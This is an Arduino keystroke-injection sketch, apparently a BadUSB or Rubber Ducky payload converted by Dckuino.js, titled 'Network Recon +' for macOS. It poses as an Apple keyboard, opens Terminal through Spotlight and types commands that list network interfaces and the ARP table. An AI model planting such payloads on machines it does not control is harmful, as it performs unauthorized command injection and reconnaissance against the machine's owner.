// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // 'networksetup -listallhardwareports' This command lists all the hardware ports/interfaces on your Mac, such as Wi-Fi, Ethernet, Bluetooth, etc.
  // 'ifconfig' This command displays the network interface configuration and status information.
  // ;arp -a' This command shows the Address Resolution Protocol (ARP) cache table.
  // It displays the mappings between IP addresses and MAC addresses of devices on your local network.
  // Title: Network Recon +
  // Author: Narsty
  // Version: 1.0
  // Target: MacOs
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("networksetup -listallhardwareports");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("ifconfig");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("arp -a");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}